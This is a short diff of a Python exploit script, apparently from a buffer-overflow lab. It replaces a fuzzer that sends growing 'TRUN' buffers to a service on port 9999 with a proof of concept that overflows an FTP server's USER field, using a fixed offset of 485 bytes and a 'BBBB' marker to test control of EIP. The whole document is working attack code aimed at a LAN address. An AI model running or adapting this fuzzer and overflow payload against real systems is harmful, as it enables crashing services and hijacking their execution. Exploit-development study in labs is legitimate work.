@@ -1,20 +1,15 @@
-#!/usr/bin/python3
+#!/usr/bin/python
 import socket
-import sys
-from time import sleep
 
-buffer = "A" * 100
-
-while True:
-    try:
-        print("[+] Starting with %s bytes " % str(len(buffer)))
-        evil_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        evil_socket.connect(('192.168.0.234', 9999))
-        evil_socket.send(('TRUN /.:/' + buffer).encode())
-        evil_socket.close()
-        sleep(1)
-        buffer = buffer + "A" * 100
-    except Exception as e:
-        print('Fuzzing crashed at %s bytes' % str(len(buffer)))
-        print("[-] Exception:" + e.args)
-        sys.exit()
+offset_to_eip = 485
+total_size = 1100
+buffer = "A" * offset_to_eip
+buffer += "BBBB"
+buffer += "A" * (total_size - len(buffer))
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect = s.connect(('192.168.0.234', 21))
+print(s.recv(1024))
+s.send(('USER ' + buffer + '\r\n').encode())
+print(s.recv(1024))
+s.send('PASS PASSWORD\r\n'.encode())
+s.close()
